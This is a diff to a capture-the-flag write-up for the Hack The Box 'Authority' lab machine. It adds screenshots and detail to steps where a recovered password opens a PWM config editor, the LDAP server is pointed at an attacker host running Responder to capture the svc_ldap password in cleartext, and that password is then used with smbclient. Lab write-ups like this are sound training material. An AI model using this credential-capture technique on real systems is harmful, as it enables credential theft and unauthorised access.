@@ -368,13 +368,18 @@ Decryption successful
 DevT3st@123        
 ```
 
-using the recovered pass is it possible to connect to the https://authority.htb:8443/pwm/private/config/editor endpoint and change the ldap server to authenticate against the attacker host
+using the recovered pass is it possible to connect to the https://authority.htb:8443/pwm/private/config/editor endpoint and change the ldap server (under LDAP->default->connection) to authenticate against the attacker host:
+
+![](./screens/4.png)
 
 ```
+
 sudo responder -I tun0
 ```
 
 clicking on "Test LDAP profile"
+
+![](./screens/5.png)
 
 ```
 [+] Listening for events...                                                                                     
@@ -392,7 +397,6 @@ LDAP        10.129.229.56   389    AUTHORITY        [+] authority.htb\svc_ldap:l
 
 ```
 
----
 ```
 smbclient -U svc_ldap '//authority.htb/Department Shares' --password=lDaP_1n_th3_cle4r!
 Try "help" to get a list of possible commands.
